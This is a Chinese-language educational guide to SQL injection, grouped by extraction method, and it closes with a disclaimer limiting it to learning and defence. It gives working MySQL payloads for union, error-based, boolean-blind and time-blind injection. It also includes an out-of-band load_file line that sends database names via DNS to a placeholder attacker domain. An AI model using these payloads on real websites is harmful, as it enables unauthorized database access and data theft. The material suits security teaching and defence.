# SQL 注入 (SQL Injection) 知识体系拆解

SQL 注入（SQLi）是 Web 安全中最经典、危害最大的漏洞之一。其本质是**数据与代码未严格分离**，导致用户输入的恶意数据被数据库引擎当作 SQL 指令执行。

本文档主要按照**数据获取方式**对 SQL 注入进行分类与原理解析。

---

## 目录
- [1. 带内注入 (In-band SQLi)](#1-带内注入-in-band-sqli)
  - [A. 联合查询注入 (Union-based)](#a-联合查询注入-union-based)
  - [B. 报错注入 (Error-based)](#b-报错注入-error-based)
- [2. 推断注入 / 盲注 (Inferential / Blind SQLi)](#2-推断注入--盲注-inferential--blind-sqli)
  - [A. 布尔盲注 (Boolean-based Blind)](#a-布尔盲注-boolean-based-blind)
  - [B. 时间盲注 (Time-based Blind)](#b-时间盲注-time-based-blind)
- [3. 带外注入 (Out-of-band SQLi / OOB)](#3-带外注入-out-of-band-sqli--oob)
- [4. 其他分类维度](#4-其他分类维度)

---

## 1. 带内注入 (In-band SQLi)

带内注入是指攻击者使用与获取结果相同的通信通道（通常是同一个 HTTP 响应页面）来提取数据。这是最简单、最高效的注入方式。

### A. 联合查询注入 (Union-based)

- **原理**：当前端页面会直接显示数据库查询的返回结果时，利用 `UNION` 运算符将恶意的查询结果追加到原始查询结果的末尾。
- **实战步骤**：
  1. 寻找注入点并判断闭合字符（如 `'`, `"`, `)` 等）。
  2. 使用 `ORDER BY` 猜解原始查询的字段数量（`UNION` 要求前后查询字段数一致）。
  3. 使用 `UNION SELECT 1,2,3...` 找出页面上的回显位。
  4. 替换回显位获取数据。
- **核心知识点 / Payload**：
  - **闭合与注释**：使用 `#`, `--+` (URL 编码为 `%23`, `--%20`) 注释后续语句。
  - **information_schema 库**：MySQL 5.0+ 自带的元数据库，重点表：`SCHEMATA`, `TABLES`, `COLUMNS`。
  - **常用函数**：
    ```sql
    -- 获取基础信息
    UNION SELECT 1, user(), database()
    -- 合并多行结果
    UNION SELECT 1, 2, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
    ```

### B. 报错注入 (Error-based)

- **原理**：前端页面不回显数据，但未屏蔽数据库报错信息。通过构造特殊格式的 SQL 语句，诱使数据库报错，并将目标数据“夹带”在错误信息中返回。
- **核心知识点 / Payload (以 MySQL 为例)**：
  - **XML 解析错误 (updatexml / extractvalue)**：
    ```sql
    -- 利用 XPath 语法错误报错
    AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)
    ```
  - **主键冲突 (floor + group by + count)**：
    利用数据库内部临时表和随机数生成机制冲突。
    ```sql
    AND (SELECT 1 FROM (SELECT count(*), concat((SELECT database()), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
    ```

---

## 2. 推断注入 / 盲注 (Inferential / Blind SQLi)

当页面既不回显数据，也不显示报错信息时，需要通过“推断”来逐个字符地猜解数据。

### A. 布尔盲注 (Boolean-based Blind)

- **原理**：页面根据 SQL 查询的逻辑真 (True) 或假 (False) 表现出**两种不同的状态**（例如：返回“查询成功”或“查询失败”）。
- **实战逻辑**：构造条件判断语句，利用二分法逐个字母地猜测。
- **核心知识点 / Payload**：
  - **字符串截取与 ASCII 转换**：`substr()`, `ascii()`
  - **逻辑判断**：
    ```sql
    -- 猜解数据库名的第一个字符是否为 's' (ASCII 码 115)
    AND ascii(substr(database(), 1, 1)) = 115
    -- 使用二分法缩小范围 (> 或 <)
    AND ascii(substr(database(), 1, 1)) > 100
    ```

### B. 时间盲注 (Time-based Blind)

- **原理**：页面的 True 和 False 状态表现完全一致，只能依靠**数据库处理请求的时间长短**来判断条件是否成立。
- **核心知识点 / Payload**：
  - **条件判断与延时函数**：`if()`, `sleep()`
    ```sql
    -- 如果数据库名第一个字符是 's'，则休眠 5 秒，否则返回 1
    AND if(ascii(substr(database(), 1, 1))=115, sleep(5), 1)
    ```

---

## 3. 带外注入 (Out-of-band SQLi / OOB)

- **原理**：当带内和盲注都受限（如严格的 WAF、异步处理）时，通过其他网络通道（最常用 DNS 或 HTTP 协议）将数据“带出”。
- **实战逻辑**：利用数据库内置功能发起外部网络请求，将数据拼接在子域名中，在攻击者控制的 DNSlog 平台查看解析记录。
- **核心知识点 / Payload**：
  - **MySQL load_file() (需 Windows 环境及权限)**：
    ```sql
    -- 将查到的 database() 拼接到攻击者的域名中发起 DNS 解析
    SELECT load_file(concat('\\\\', (SELECT database()), '.attacker-dnslog.com\\abc'))
    ```
  - **前置条件**：数据库高权限，且 `secure_file_priv` 允许。

---

## 4. 其他常见分类维度

除了按数据获取方式，SQL 注入还可以从以下维度分类：

### 按数据类型
* **数字型注入**：参数为数字（如 `?id=1`），直接拼接，无需闭合引号。
* **字符型注入**：参数为字符串（如 `?user=admin`），需用 `'` 或 `"` 闭合，并注释掉尾部引号。

### 按请求位置
* **GET / POST 注入**：存在于 URL 参数或请求体中。
* **HTTP 头注入**：注入点在 `User-Agent`, `Referer`, `Cookie` 等头部字段，常被开发者忽略。

### 二次注入 (Second-order SQLi)
* **原理**：恶意 SQL 代码初次输入时被转义并安全存入数据库；但在另一个页面**从数据库中读取**该数据并用于新的 SQL 查询时，未进行二次过滤而触发注入。

---
> **Disclaimer**: 本文档仅供网络安全学习、研究与防御参考。请勿用于任何非法授权的测试。
